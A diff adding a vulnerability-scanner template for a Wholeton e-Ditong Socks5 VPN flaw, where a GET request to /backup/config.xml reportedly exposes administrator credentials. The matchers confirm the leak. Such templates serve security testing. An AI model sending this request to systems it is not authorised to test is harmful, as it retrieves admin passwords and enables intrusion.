@@ -1,0 +1,31 @@
+id: wholeton-vpn-info-leak
+info:
+  name: 惠尔顿 e地通 config.xml 信息泄漏漏洞
+  author: apple
+  severity: high
+  description: 惠尔顿 e地通Socks5 VPN登录系统 存在信息泄漏漏洞，访问特殊的Url即可获取管理员账号密码
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /backup/config.xml HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'virtualadapter'
+      - type: word
+        part: body
+        words:
+          - 'administrator'
